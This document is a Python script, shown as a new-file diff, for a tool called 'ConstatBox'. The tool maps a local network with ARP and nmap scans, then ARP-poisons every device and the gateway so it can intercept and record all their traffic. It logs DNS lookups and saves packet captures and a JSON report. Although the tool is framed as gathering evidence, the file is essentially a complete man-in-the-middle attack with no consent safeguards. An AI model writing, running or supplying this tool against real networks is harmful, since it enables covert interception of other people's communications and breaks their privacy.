@@ -1,0 +1,232 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Created on Mon Feb  2 16:14:17 2026
+
+@author: benbruno
+"""
+import json
+import os
+import subprocess
+import time
+from datetime import datetime
+import netifaces
+import nmap
+from scapy.all import ARP, Ether, srp, conf, send, wrpcap, IP, DNS, DNSQR, AsyncSniffer
+
+# --- CONFIGURATION ---
+DURATION_SNIFF = 60
+WHITELIST = ["8.8.8.8", "1.1.1.1"] 
+ARCHIVE_DIR = "archives"
+
+if not os.path.exists(ARCHIVE_DIR):
+    os.makedirs(ARCHIVE_DIR)
+
+# --- STATISTIQUES GLOBALES ---
+stats = {"dns_queries": 0, "external_alerts": 0, "total_packets": 0}
+
+# --- FONCTIONS D'IDENTIFICATION ---
+
+def get_vendor_and_type(mac, vendor_from_nmap=None):
+    vendor = vendor_from_nmap if vendor_from_nmap else conf.manufdb._get_manuf(mac)
+    mac_lower = mac.lower()
+    is_private = mac_lower[1] in ['2', '6', 'a', 'e']
+    final_vendor = vendor if vendor else ("Private MAC" if is_private else "Unknown")
+    vendor_low = final_vendor.lower()
+    
+    device_type = "Station/Workstation"
+    if is_private: device_type = "Mobile (Privacy Mode)"
+    elif any(x in vendor_low for x in ["apple", "samsung", "google", "huawei"]): device_type = "Mobile/Tablet"
+    elif any(x in vendor_low for x in ["cisco", "tp-link", "netgear", "d-link", "sagemcom", "technicolor"]): device_type = "Infrastructure"
+    elif any(x in vendor_low for x in ["raspberry", "espressif", "arduino"]): device_type = "IoT/Embedded"
+    
+    return final_vendor, device_type
+
+# --- FONCTIONS DE RÉSEAU (PHASE 1) ---
+
+def scan_host_ports(ip):
+    nm = nmap.PortScanner()
+    try:
+        nm.scan(ip, arguments='-F -sV --connect-timeout 2')
+        if ip not in nm.all_hosts(): return [], "Unknown"
+        ports_data = []
+        hostname = nm[ip].hostname()
+        for proto in nm[ip].all_protocols():
+            for port in nm[ip][proto].keys():
+                if nm[ip][proto][port]['state'] == 'open':
+                    ports_data.append({
+                        "port": port, "service": nm[ip][proto][port]['name'], "version": nm[ip][proto][port]['product']
+                    })
+        return ports_data, hostname
+    except: return [], "Unknown"
+
+def get_available_wifi():
+    networks_dict = {}
+    try:
+        cmd = "nmcli -t -f SSID,SIGNAL,SECURITY dev wifi"
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+        for line in output.strip().split('\n'):
+            if line:
+                parts = line.split(':')
+                ssid = parts[0]
+                if not ssid: continue
+                sig = int(parts[1].replace('%', ''))
+                if ssid not in networks_dict or sig > int(networks_dict[ssid]['signal'].replace('%', '')):
+                    networks_dict[ssid] = {"ssid": ssid, "signal": f"{sig}%", "security": parts[2]}
+    except: pass
+    return sorted(list(networks_dict.values()), key=lambda x: int(x['signal'].replace('%','')), reverse=True)
+
+def get_local_info():
+    gws = netifaces.gateways()
+    iface = gws['default'][netifaces.AF_INET][1]
+    gateway = gws['default'][netifaces.AF_INET][0]
+    ip_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
+    network = ".".join(ip_info['addr'].split('.')[:-1]) + ".0/24"
+    return iface, network, gateway
+
+def get_mac(ip, iface):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
+    if ans: return ans[0][1].hwsrc
+    return None
+
+# --- MODULE D'INTERCEPTION & ANALYSE (PHASE 2) ---
+
+def analyze_packet(pkt):
+    global stats
+    stats["total_packets"] += 1
+    if pkt.haslayer(IP):
+        src_ip = pkt[IP].src
+        dst_ip = pkt[IP].dst
+        
+        # 1. DNS Analysis
+        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
+            stats["dns_queries"] += 1
+            try:
+                query = pkt.getlayer(DNSQR).qname.decode()
+                print(f"    [WEB-DNS] {src_ip} -> {query}")
+            except: pass
+            
+        # 2. External Alerts
+        if not dst_ip.startswith("192.168.") and not dst_ip.startswith("172.") and dst_ip not in WHITELIST and not dst_ip.startswith("239."):
+            stats["external_alerts"] += 1
+            print(f"    [ALERTE EXTERNE] {src_ip} envoie des données vers {dst_ip}")
+
+def spoof_all(devices, gateway_ip, iface):
+    for d in devices:
+        if not d['is_gateway']:
+            send(ARP(op=2, pdst=d['ip'], hwdst=d['mac'], psrc=gateway_ip), iface=iface, verbose=False)
+            send(ARP(op=2, pdst=gateway_ip, psrc=d['ip']), iface=iface, verbose=False)
+
+def restore_all(devices, gateway_ip, gateway_mac, iface):
+    print(f"\n[*] Nettoyage du réseau : Rétablissement des tables ARP...")
+    for d in devices:
+        if not d['is_gateway']:
+            send(ARP(op=2, pdst=d['ip'], hwdst=d['mac'], psrc=gateway_ip, hwsrc=gateway_mac), count=2, iface=iface, verbose=False)
+
+def run_tshark_live(iface, duration):
+    cmd = [
+        "tshark", "-i", iface, "-a", f"duration:{duration}",
+        "-T", "fields", "-e", "_ws.col.Protocol", "-e", "ip.src", "-e", "ip.dst",
+        "-Y", "not arp and not icmp"
+    ]
+    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+
+# --- EXECUTION ---
+
+def run_constat_global():
+    iface, network, gateway = get_local_info()
+    gateway_mac = get_mac(gateway, iface)
+    now = datetime.now()
+    ts_str = now.strftime("%Y%m%d_%H%M%S")
+
+    print("="*95)
+    print(f" 🛡️  CONSTATBOX v3.0 GLOBAL INTERCEPTOR | {now.strftime('%d/%m/%Y %H:%M:%S')}")
+    print(f" Interface: {iface} | Gateway: {gateway} ({gateway_mac})")
+    print("="*95)
+
+    # PHASE 1 : SCAN
+    print(f"[*] ÉTAPE 1 : Cartographie complète du réseau...")
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, iface=iface, verbose=False)
+    
+    devices = []
+    for sent, rcv in ans:
+        print(f"    [+] Analyse de l'hôte {rcv.psrc}...")
+        ports, hostname = scan_host_ports(rcv.psrc)
+        vendor, dev_type = get_vendor_and_type(rcv.hwsrc)
+        devices.append({
+            "ip": rcv.psrc, "hostname": hostname, "mac": rcv.hwsrc.upper(),
+            "vendor": vendor, "type": dev_type, "is_gateway": rcv.psrc == gateway, "open_ports": ports
+        })
+
+    # AFFICHAGE SYNTHÈSE SCAN
+    print("\n" + "📑 DISPOSITIFS IDENTIFIÉS")
+    print("─"*95)
+    for d in devices:
+        gw_label = " ⭐ [GATEWAY]" if d['is_gateway'] else ""
+        print(f"{d['ip']:<15} | {d['mac']} | {d['type']:<20} | {d['vendor']}{gw_label}")
+        if d['open_ports']:
+            ports_str = ", ".join([str(p['port']) for p in d['open_ports']])
+            print(f"               └─ Ports ouverts : {ports_str}")
+
+    # PHASE 2 : INTERCEPTION
+    print("\n" + "═"*95)
+    print(f" 🔍 ÉTAPE 2 : INTERCEPTION GLOBALE ET SNIFFING ({DURATION_SNIFF}s)")
+    print("═"*95)
+
+    sniffer = AsyncSniffer(iface=iface, prn=analyze_packet, store=True)
+    sniffer.start()
+    tshark_proc = run_tshark_live(iface, DURATION_SNIFF)
+
+    try:
+        start_time = time.time()
+        while time.time() - start_time < DURATION_SNIFF:
+            spoof_all(devices, gateway, iface)
+            # Affichage de la progression
+            elapsed = int(time.time() - start_time)
+            percent = int((elapsed / DURATION_SNIFF) * 100)
+            bar = "█" * (percent // 2) + "-" * (50 - percent // 2)
+            print(f"\r    PROGRESSION : |{bar}| {percent}% ({elapsed}/{DURATION_SNIFF}s)", end="")
+            
+            # Lecture d'une ligne TShark pour le live
+            line = tshark_proc.stdout.readline()
+            if line:
+                print(f"\n    [LIVE] {line.strip()}")
+            
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[!] Arrêt prématuré demandé.")
+
+    packets = sniffer.stop()
+    tshark_proc.terminate()
+    restore_all(devices, gateway, gateway_mac, iface)
+
+    # SAUVEGARDE & FORENSIC
+    pcap_path = f"{ARCHIVE_DIR}/global_evidence_{ts_str}.pcap"
+    wrpcap(pcap_path, packets)
+    
+    # --- AJOUT POUR LA SAUVEGARDE JSON ---
+    wifi_list = get_available_wifi() # On récupère les réseaux Wi-Fi alentours
+    report_data = {
+        "timestamp": now.isoformat(),
+        "network_info": {"interface": iface, "network": network, "gateway": gateway},
+        "devices": devices, # La liste des IPs/MACs trouvées à l'étape 1
+        "wifi": wifi_list,
+        "stats": stats # Les compteurs de paquets et alertes
+    }
+    
+    json_path = f"{ARCHIVE_DIR}/scan_{ts_str}.json"
+    with open(json_path, "w") as f:
+        json.dump(report_data, f, indent=4)
+    
+    print(f"   - Archive JSON : {json_path}")
+    print("\n" + "═"*95)
+    print(f"📊 RAPPORT D'INTERCEPTION TERMINÉ")
+    print(f"   - Paquets capturés : {stats['total_packets']}")
+    print(f"   - Requêtes DNS identifiées : {stats['dns_queries']}")
+    print(f"   - Communications suspectes : {stats['external_alerts']}")
+    print(f"   - Fichier de preuve : {pcap_path}")
+    print("═"*95)
+
+if __name__ == "__main__":
+    if os.getuid() != 0: print("[!] SUDO requis pour l'empoisonnement ARP.")
+    else: run_constat_global()
